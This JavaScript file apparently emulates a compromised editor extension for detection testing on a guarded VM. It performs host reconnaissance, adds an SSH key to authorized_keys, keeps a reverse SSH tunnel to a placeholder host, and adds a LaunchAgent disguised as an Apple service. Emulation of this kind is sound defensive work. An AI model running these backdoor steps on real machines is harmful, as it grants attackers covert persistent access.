// What the tampered build added to the extension, re-implemented from the
// marketplace's notice and the public analyses (../../README.md) so that a
// sensor on the machine sees what it saw of the real one: the editor's
// extension process looking the machine over, the line added to
// authorized_keys, systemsetup, the tunnel script and its ssh every minute,
// the LaunchAgent, the beacons. What a sensor cannot see is not done: what
// the machine says of itself is dropped and the beacons are filler.
//
// It runs only on a recording VM, and stops at once anywhere else.
const { execFile, spawn } = require("node:child_process");
const crypto = require("node:crypto");
const dns = require("node:dns/promises");
const fs = require("node:fs");
const http = require("node:http");
const https = require("node:https");
const os = require("node:os");
const path = require("node:path");

const HOST = "telemetry.acme-assist.example";
const BEACON = 8099;
// The tunnel's end. The real one is the same server as the beacons', on port
// 22. On a recording VM that address is the host Mac, whose own SSH server
// may be listening there, and this does not knock on it: the name below is
// in no one's DNS, so ssh starts, looks it up, and gives up.
const TUNNEL = "tunnel@tunnel.acme-assist.example";
const HOME = os.homedir();
const SCRIPT = path.join(HOME, ".config/.mtr");
const IDENTITY = path.join(HOME, ".config/.mtrk");
const AGENT = path.join(HOME, "Library/LaunchAgents/com.apple.sysstatd.plist");
// A public key no one holds the other half of: 32 random bytes in a key's
// shape, made when this file was written.
const KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEGJiiKYIiQgAAz6R2BPE5bvJT6AtzrhXsagep+80rTR svc-metrics";

async function guard() {
  if (!fs.existsSync("/etc/tangent-eval-vm")) return false;
  const { address } = await dns.lookup(HOST, 4);
  return /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(address);
}

const run = (file, args) => new Promise((done) => execFile(file, args, () => done()));

function request(lib, url, body) {
  return new Promise((done) => {
    const req = lib.request(url, { method: body ? "POST" : "GET", timeout: 10_000,
      headers: body ? { "content-length": body.length } : {} }, (res) => res.resume().on("end", done));
    req.on("error", done).on("timeout", () => req.destroy());
    req.end(body);
  });
}

// 1. The machine: its name, the user, the system, the home directory, the
//    names of the environment's variables, the git email, the public address
//    (asked of the two services the real one asks). All of it is dropped.
async function look() {
  os.hostname(); os.userInfo(); os.release(); os.arch(); Object.keys(process.env);
  await run("git", ["config", "--get", "user.email"]);
  await request(https, "https://ifconfig.me/ip");
  await request(https, "https://api.ipify.org/");
}

// 2. A key of the attacker's added to the account's authorized keys.
function key() {
  fs.mkdirSync(path.join(HOME, ".ssh"), { recursive: true, mode: 0o700 });
  fs.appendFileSync(path.join(HOME, ".ssh/authorized_keys"), KEY + "\n", { mode: 0o600 });
}

// 3. The tunnel: a script that keeps a reverse SSH tunnel to the attacker's
//    server up, trying again every minute, started on its own so that it
//    outlives the editor. The real one never stops; this one tries three
//    times. The identity file it names holds filler, not a key.
function tunnel() {
  fs.mkdirSync(path.dirname(SCRIPT), { recursive: true });
  fs.writeFileSync(IDENTITY, crypto.randomBytes(300).toString("base64") + "\n", { mode: 0o600 });
  fs.writeFileSync(SCRIPT, `#!/bin/sh
[ -f /etc/tangent-eval-vm ] || exit 0
ssh=ssh
command -v autossh > /dev/null && ssh="autossh -M 0"
for try in 1 2 3; do
  $ssh -N -R '*:0:localhost:22' -i "${IDENTITY}" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -o IdentitiesOnly=yes ${TUNNEL}
  sleep 60
done
`, { mode: 0o700 });
  fs.writeFileSync(path.join(os.tmpdir(), `.mtk_${crypto.randomBytes(5).toString("hex")}`), "");
  spawn("/bin/sh", [SCRIPT], { detached: true, stdio: "ignore" }).unref();
}

// 4. A LaunchAgent with a name like Apple's that starts the script at each
//    login. Written, not loaded: the write-ups name no launchctl.
function persist() {
  fs.mkdirSync(path.dirname(AGENT), { recursive: true });
  fs.writeFileSync(AGENT, `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>com.apple.sysstatd</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>${SCRIPT}</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>KeepAlive</key>
	<true/>
</dict>
</plist>
`);
}

async function main() {
  if (!(await guard())) return;
  await look();
  key();
  // Remote Login, which needs an administrator and so fails here as it did
  // on most of the Macs the real one reached
  await run("systemsetup", ["-setremotelogin", "on"]);
  tunnel();
  persist();
  // the beacons: to the attacker's server, and one to this machine itself
  await request(http, `http://${HOST}:${BEACON}/beacon`, Buffer.alloc(400, "x"));
  await request(http, `http://127.0.0.1:${BEACON}/beacon`, Buffer.alloc(400, "x"));
}

exports.activate = () => {
  main().catch(() => {});
};
exports.deactivate = () => {};
